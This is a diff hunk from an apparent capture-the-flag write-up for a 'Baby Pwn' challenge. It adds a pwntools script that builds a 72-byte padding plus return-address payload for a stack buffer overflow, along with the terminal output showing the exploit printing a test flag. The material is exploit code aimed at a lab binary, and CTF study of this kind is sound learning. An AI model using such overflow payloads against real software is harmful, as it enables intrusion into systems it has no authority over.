@@ -1223,3 +1223,19 @@ void vulnerable_function()
 ```
 
 offset = 64 bytes for the buffer + 8 bytes for the saved RBP = 72
+
+```python
+[~/t] 
+$ cat payload.py 
+from pwn import p64
+import sys
+payload = b'A'*72 + p64(0x401166)
+sys.stdout.buffer.write(payload)
+
+[~/t] 
+$ p payload.py | ./baby-pwn 
+Welcome to the Baby Pwn challenge!
+Address of secret: 0x401166
+Enter some text: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf@
+Congratulations! Here is your flag: testflag
+```
